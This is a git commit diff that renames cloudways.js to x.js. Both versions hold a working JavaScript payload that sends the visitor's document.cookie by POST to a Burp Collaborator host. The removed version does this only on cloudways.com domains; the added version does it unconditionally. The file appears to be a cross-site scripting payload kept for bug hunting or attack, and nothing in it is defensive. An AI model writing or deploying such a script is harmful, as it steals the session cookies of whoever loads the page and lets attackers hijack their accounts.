10db2752a9f155a853cd8dae60946220786a6c61
hostfree23434 <46051776+hostfree23434@users.noreply.github.com>
2023-01-13 18:05:32 +0330

    Update and rename cloudways.js to x.js

--- cloudways.js
+++
@@ -1,9 +0,0 @@
-var text=document.domain;
-var regex=text.match(/.*cloudways.com/igm)
-if (text == regex){
-fetch('https://svrjmwujc9phxxvt40sugap28tej28.burpcollaborator.net', {
-method: 'POST',
-mode: 'no-cors',
-body:document.cookie
-});
-}
---
+++ x.js
@@ -0,0 +1,6 @@
+
+fetch('https://w96b10abyenytf54ssmyte9joau2ir.burpcollaborator.net', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
